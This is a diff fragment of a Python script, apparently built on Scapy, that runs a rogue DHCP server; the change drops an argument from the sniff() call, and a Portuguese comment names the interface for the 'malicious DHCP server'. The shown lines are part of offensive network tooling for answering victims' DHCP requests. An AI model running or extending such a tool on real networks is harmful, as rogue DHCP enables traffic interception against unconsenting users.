@@ -37,7 +37,7 @@ def rogue_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, route
             sendp(dhcp_ack, iface=interface, verbose=0)
 
     print(f"Starting Rogue DHCP Server on interface {interface}...")
-    sniff(filter="udp and (port 67 or 68)", prn=dhcp_server, store=0, iface=interface, inter=0.1)
+    sniff(filter="udp and (port 67 or 68)", prn=dhcp_server, store=0, iface=interface)
 
 if __name__ == "__main__":
     interface = "eth0"   # Interface de rede a ser usada para o servidor DHCP malicioso
